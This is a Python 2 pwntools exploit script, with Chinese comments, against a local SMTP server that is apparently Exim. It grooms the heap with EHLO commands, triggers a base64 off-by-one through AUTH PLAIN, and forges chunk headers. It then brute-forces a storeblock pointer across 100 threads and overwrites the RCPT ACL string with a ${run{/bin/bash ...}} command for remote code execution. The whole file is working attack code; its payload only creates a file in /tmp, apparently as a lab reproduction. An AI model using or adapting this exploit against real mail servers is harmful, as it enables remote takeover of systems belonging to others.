#!/usr/bin/python2
# -*- coding: utf-8 -*

import time

from pwn import *
from base64 import b64encode
from threading import Thread

def ehlo(p,v):
    time.sleep(0.1)
    p.sendline("EHLO " + v)
    data=p.recvuntil("HELP")
    #print(data)

def unrec(p,v):
    time.sleep(0.1)
    p.sendline(v)
    data=p.recvuntil("command")
    #print(data)

def auth_plain(p,v):
    time.sleep(0.1)
    p.sendline("AUTH PLAIN {}".format(v))
    #data=p.recvuntil("data")
    #print()

def bad_base64(v, s=None):
    '''
    if s is not None, it is tailed follow the encode content of v
    如果s是1个字节，则程序解码后的末尾不会补0
    如果s是2个字节，则程序解码后的末尾会解码出一个字符
    '''
    #print "the origial code length is %d "%  len(v)
    encode=b64encode(v).replace("\n", "").replace("=", "")
    if s and len(s) > 0:
        encode=encode + s
    #print "the encode length is %d "%  len(encode)
    return encode

            
def getNum(Num):
    '''
    按8位的顺序，从低到高逐渐取值
    '''
    power_level=0 #16进制的位数
    #print hex(Num)
    while ( Num/(16**power_level) ):
        power_level+=1
    #print power_level 

    remain=Num
    rets=list()
    while power_level>0:
        ret= remain&0xff
        power_level-=2
        remain>>=8
        rets.append(ret)
        #print "remain is 0x%x"%remain
        #print "ret is 0x%x"%ret
        #print ""
    return rets 

def exploit(try_addr):
    context.log_level='warning'
    p = remote("localhost", 25)
    time.sleep(0.2)
   
    #raw_input("step1-1: ehlo 0x1f40")
    ehlo(p,"A" * 0x1F40)
    #raw_input("step1-2: ehlo 0x10")
    ehlo(p,"B" * 0x10)
    
    # 0x7d0=2000
    # 需要 0x7d0+0x7d0*3+1=8001的空间
    #raw_input("step2: uncommd 0x7d0")
    # 全部是不可打印字符，会生成
    unrec(p,"\xff" * 0x7D0)

    #raw_input("step3: ehlo 0x2008")
    ehlo(p,"C" * 0x2008)

    # 以上完成布局

    #raw_input("step4: send bad data via to trigger off-by-one")
    #tail = b64encode('\xf2\xf1\xf3')
    tail = bad_base64('\xf2\xf1\xf3')
    content = bad_base64("D"*8199)  + tail[:-1] # -1的时候就会溢出，-2的时候不溢
    #content=bad_base64("D" * 0x2008)[:-1] + "PE"
    auth_plain(p,content)

    #raw_input("step5: fake chunk head")
    # storeblock 头
    new_header_offset = (
        0xD0 - 0x10 - 0x10
    )  # extension size (0x20f0-0x2020) - chunk and storeblock headers size (0x10+0x10)
    # 原始是storeblock的长度都是0x2000+8
    b2_size = 0x2008  # size of second b64 decoded storeblock
    # fake chunk 头
    fake_chunk_header = p64(0)  # prev_size
    # 缩减后的block的长度 0x2020-(0x20f0-0x2020)=0x1f50
    fake_chunk_header += p64(0x1F51)  # size
    # 构造数据
    content= bad_base64(
            "E" * new_header_offset
            + fake_chunk_header
            + "F" * (b2_size - new_header_offset - len(fake_chunk_header))
        )
    auth_plain(p,content)

    #raw_input("step6: echo 16")
    # 为了释放,将未修改的指针存入到unsoreted bin链表中，其和当前的堆块布局存在overlap情况 
    ehlo(p,"G" * 16)

    #raw_input("step7: 占用第一个unsorted block")
    unrec(p,"\xff" * 0x7D0)
    #raw_input("step8: 占用第二个unsorted block") #会占用两个
    unrec(p,"\xff" * 0x7D0)
    
    #raw_input("step9:  发送数据,使用布局所得的第一个freed 块")
    fake_chunk_header = p64(0x4110) #  这个什么用?
    fake_chunk_header += p64(0x1F50) # cur size，保证堆平衡,0x1f50
    content=bad_base64(
            "H" * new_header_offset
            + fake_chunk_header
            + "I" * (b2_size - new_header_offset - len(fake_chunk_header))
        )
    auth_plain(p,content)

    try:
    #if 1:
        # 上下文过程会使用部分第二freed块
        #raw_input("step10:  发送数据,使用布局所得的第二个freed块")
        # address of the ACL strings storeblock (not the chunk)
        address_of_acl_storeblock =0x5588981bf480 
        # 数据起始地址为0x5588981e2d20
        # 实际的next指针为0x5588981e0ce0 #低20位不同
        # 下个storeblock的next指针位置是 0x5588981e4d40,偏移是0x2020
        #address_of_acl_storeblock="\x80\xf4\x1b"
        # 方式1  
        # 逐个取低8位
        rets = getNum(try_addr)
        content=bad_base64(
                "J" * 0x2008  # filler
                + p64(0x2021)  # chunk size,维持不变
                +p8(rets[0])
                +p8(rets[1])
                +p8(rets[2])
                #+ address_of_acl_storeblock # next指针
                , "A"
            )
        #print content

        # 方式2
        # 后面数据不一定需要覆盖
        # content=bad_base64(
                # "J" * 0x2008  # filler
                # + p64(0x2021)  # chunk size,维持不变
                # + p64(address_of_acl_storeblock) # next指针
                # + p64(0x2008)  # storeblock length (size)
                # + "K" * 0xB8  # filler
            # )
        auth_plain(p,content) 

        #raw_input("step11: 释放字符串堆块")
        # this releases the storeblocks (also our ACL storeblock) because of the reset
        ehlo(p,"L" * 16)

        #raw_input("step12: 修改字符串")
        # the offset from ACL string storeblock address + 0x10 until the acl_smtp_rcpt string
        acl_smtp_rcpt_offset = 0x120
        cmd = '/bin/bash -c "touch /tmp/xiaosa3"'
        cmd_expansion_string = "${run{" + cmd + "}}\0"
        
        # overwrite the acl_smtp_rcpt string with our custom command
        content = bad_base64(
                "M" * acl_smtp_rcpt_offset
                + cmd_expansion_string
                + "N" * (0x2008 - acl_smtp_rcpt_offset - len(cmd_expansion_string))
            )
        auth_plain(p,content)
        
        #raw_input("step13: 触发漏洞 ")
        p.sendline("MAIL FROM:<fun@pabe.seclab-bonn.de>")
        print(p.recvuntil("OK"))
        # this will trigger the ACL check!
        p.sendline("RCPT TO:<hack-the-heap@pabe.seclab-bonn.de>")   
        p.close()
        return 1
        #print(p.recvuntil("OK"))
    #else:
    except:
        p.close()
        return 0



isSucc=False
def brute_force(left,right):
    global isSucc # 
    for addr in range(left, right):
        if isSucc:
            break
        print "try addr 0x%x"%addr
        ret=exploit(addr)
        if ret==1:
            print ""
            print("Exploit Succ at 0x%x!"% addr)
            isSucc=True
            break

def threaded_brute_force(num_threads=100):
    threads = []
    start_addr = 0x100000
    end_addr=0x1000000
    start_addr =0x1b0000 
    end_addr= 0x1bf481
    # 取整
    arr=(end_addr-start_addr)%num_threads
    step = (end_addr+num_threads-arr-start_addr)/num_threads
    for i in range(num_threads):
        #print  "deal with [0x%x to 0x%x)"%(start_addr, start_addr+step)
        t = Thread(target=brute_force, args=(start_addr, start_addr+step))
        threads.append(t)
        t.start()
        start_addr += step

if __name__ == "__main__":
    threaded_brute_force()
